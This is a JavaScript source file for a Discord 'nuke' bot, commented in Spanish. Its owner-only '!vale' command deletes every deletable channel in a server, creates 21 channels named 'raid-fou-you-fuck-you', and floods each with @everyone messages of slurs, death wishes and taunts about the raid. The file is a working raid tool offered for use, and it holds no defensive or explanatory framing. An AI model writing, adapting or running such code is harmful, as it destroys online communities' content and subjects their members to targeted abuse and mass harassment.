require('dotenv').config();

const { Client, GatewayIntentBits, ChannelType } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

const PREFIX = '!';
const OWNER_IDS = ["1436516806842912970"]; // ← cambia por tu ID real si es necesario

client.once('ready', () => {
  console.log('Bot conectado como ' + client.user.tag);
  console.log('Prefijo: ' + PREFIX);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'test') {
    return message.reply('¡El bot funciona! Prefijo detectado correctamente.');
  }

  if (command === 'help') {
    return message.reply('Comandos disponibles:\n!test → prueba rápida\n!vale → nuke personalizado (solo tú)\n!help → este mensaje');
  }

  if (command === 'vale') {
    if (!OWNER_IDS.includes(message.author.id)) {
      return message.reply('No tienes permiso para este comando tan heavy.');
    }

    // ────────────────────────────────────────────────
    //     === PERSONALIZA AQUÍ TODO LO QUE QUIERAS ===
    // ────────────────────────────────────────────────

    // NOMBRES DE CANALES (agrega o cambia líneas aquí)
    const nombresDeCanales = [
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      "raid-fou-you-fuck-you",
      // Agrega más líneas para más canales
    ];

    // MENSAJES QUE SE ENVIARÁN EN CADA CANAL (agrega o cambia aquí)
    const mensajesEnRafaga = [
      "@everyone domado sale en las noticias chupando pene",
      "@everyone DOMADO POR la elite 7 subnormal",
      "@everyone JAJAJAJAJA PUTO PERRO",
      "@everyone ojalas te mueras hijueputa",
      "@everyone puto mal parido hijueputa",
      "@everyone Ya te hicieron raid a tu mierda de server",
      "@everyone pendejo subnormal hijueputa",
      "@everyone Tu server asqueroso JAJAJAJa",
      // Agrega más mensajes si quieres más spam por canal
    ];

    const delayEntreMensajes = 1500; // milisegundos entre mensajes (1.5s) - sube si te da rate limit

    // ────────────────────────────────────────────────
    //        NO CAMBIES DE AQUÍ PARA ABAJO
    // ────────────────────────────────────────────────

    try {
      await message.reply(
        `**¡NUKE PERSONALIZADO INICIANDO EN 5 SEGUNDOS!**\n\n` +
        `→ Creando **${nombresDeCanales.length}** canales\n` +
        `→ Enviando **${mensajesEnRafaga.length}** mensajes en CADA canal\n\n` +
        `¡No lo uses en servidores ajenos o te banean el bot!`
      );

      await new Promise(r => setTimeout(r, 5000));

      const guild = message.guild;

      // 1. Borrar canales (excepto el actual)
      let borrados = 0;
      for (const ch of guild.channels.cache.values()) {
        if (ch.deletable && ch.id !== message.channel.id) {
          try {
            await ch.delete('Nuke by Patricio');
            borrados++;
            await new Promise(r => setTimeout(r, 400));
          } catch {}
        }
      }
      await message.channel.send(`→ Borrados **${borrados}** canales.`);

      // 2. Crear canales personalizados
      const nuevosCanales = [];
      for (const nombreOriginal of nombresDeCanales) {
        try {
          let nombre = nombreOriginal
            .toLowerCase()
            .replace(/[^a-z0-9- ]/g, '-')
            .replace(/\s+/g, '-')
            .replace(/-+/g, '-')
            .replace(/^-|-$/g, '')
            .slice(0, 100) || 'raid-default';

          const canal = await guild.channels.create({
            name: nombre,
            type: ChannelType.GuildText,
            permissionOverwrites: [
              { id: guild.id, allow: ['ViewChannel', 'SendMessages', 'MentionEveryone'] }
            ]
          });

          nuevosCanales.push(canal);
          console.log(`Creado → #${canal.name}`);
          await new Promise(r => setTimeout(r, 1000)); // 1s entre creaciones para evitar rate limit
        } catch (err) {
          console.log(`Fallo creando "${nombreOriginal}": ${err.message}`);
        }
      }
      await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);

      // 3. Enviar mensajes personalizados en cada canal
      let spameados = 0;
      for (const canal of nuevosCanales) {
        try {
          for (const msg of mensajesEnRafaga) {
            await canal.send(msg);
            console.log(`Enviado a #${canal.name}`);
            await new Promise(r => setTimeout(r, delayEntreMensajes));
          }
          spameados++;
        } catch (err) {
          console.log(`Problema en #${canal.name}: ${err.message}`);
        }
      }

      await message.channel.send(`**¡TERMINADO!** 😈\nCanales spameados: **${spameados}**`);

    } catch (err) {
      console.error('Error en !vale:', err.message || err);
      await message.channel.send(`**Error grave:** ${err.message || 'Revisa logs'}`).catch(() => {});
    }
  }
});

client.login(process.env.TOKEN).catch(err => {
  console.error('Error al conectar:', err.message || err);
});